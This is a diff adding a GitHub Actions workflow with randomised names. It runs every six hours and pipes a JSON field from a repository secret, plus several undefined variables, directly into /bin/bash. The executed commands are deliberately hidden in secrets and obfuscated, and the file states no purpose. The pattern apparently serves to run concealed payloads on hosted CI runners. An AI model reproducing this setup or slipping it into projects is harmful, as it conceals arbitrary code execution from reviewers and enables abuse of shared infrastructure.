@@ -1,0 +1,25 @@
+name: zhoujinwei2345
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhoujinwei2345
+        env:
+          lw674: ${{ secrets.lw674 }}
+        run: |
+          echo $lw674 | jq -r .qx705 | /bin/bash
+          echo $rxv4074 | jq -r .agmx85362 | /bin/bash
+          echo $nhz4 | jq -r .mqpe7088 | /bin/bash
+          echo $sovv8 | jq -r .zos24 | /bin/bash
+          echo $qulis674 | jq -r .hxgyf48649 | /bin/bash
+          echo $wcn194 | jq -r .iatg82 | /bin/bash
+          echo $rw546 | jq -r .g07292 | /bin/bash
+          echo $x77916 | jq -r .r27949 | /bin/bash
+          echo $dbylj2 | jq -r .oh74806 | /bin/bash
+
